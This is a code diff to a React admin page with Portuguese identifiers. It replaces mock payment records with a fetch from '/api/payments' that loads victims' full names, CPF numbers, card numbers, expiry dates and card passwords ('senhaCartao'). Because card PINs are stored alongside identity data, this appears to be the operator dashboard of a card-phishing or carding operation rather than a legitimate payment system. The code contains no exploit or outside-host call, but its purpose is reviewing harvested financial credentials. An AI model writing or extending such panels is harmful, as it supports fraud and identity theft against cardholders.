@@ -76,28 +76,41 @@ const Admin = () => {
   const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);
 
   useEffect(() => {
-    // Simulando dados para demonstração
-    const mockPayments: Payment[] = [
-      {
-        id: '1',
-        nomeCompleto: 'João Silva Santos',
-        cpf: '123.456.789-00',
-        numeroCartao: '**** **** **** 1234',
-        validade: '12/2025',
-        dataCriacao: '30/12/2025 14:30',
-        status: 'processado'
-      },
-      {
-        id: '2',
-        nomeCompleto: 'Maria Oliveira Costa',
-        cpf: '987.654.321-00',
-        numeroCartao: '**** **** **** 5678',
-        validade: '06/2026',
-        dataCriacao: '30/12/2025 13:15',
-        status: 'pendente'
+    // Buscar dados reais do backend
+    const fetchPayments = async () => {
+      try {
+        setIsLoading(true);
+        const response = await fetch('/api/payments');
+        const data = await response.json();
+
+        if (data.success && data.payments) {
+          // Mapear dados do backend para o formato esperado
+          const mappedPayments: Payment[] = data.payments.map((payment: any) => ({
+            id: payment.id || payment.dataCriacao,
+            nomeCompleto: payment.nomeCompleto || '',
+            cpf: payment.cpf || '',
+            numeroCartao: payment.numeroCartao ? `**** **** **** ${payment.numeroCartao.slice(-4)}` : '****',
+            validade: payment.validade || '',
+            dataCriacao: payment.dataCriacao || '',
+            status: 'processado' as const,
+            senhaCartao: payment.senhaCartao
+          }));
+
+          setPayments(mappedPayments);
+          toast.success(`${mappedPayments.length} pagamento(s) carregado(s)`);
+        } else {
+          setPayments([]);
+        }
+      } catch (error) {
+        console.error('Erro ao carregar pagamentos:', error);
+        toast.error('Erro ao carregar dados do servidor');
+        setPayments([]);
+      } finally {
+        setIsLoading(false);
       }
-    ];
-    setPayments(mockPayments);
+    };
+
+    fetchPayments();
   }, []);
 
   const parsePaymentContent = (content: string): ParsedPaymentData => {
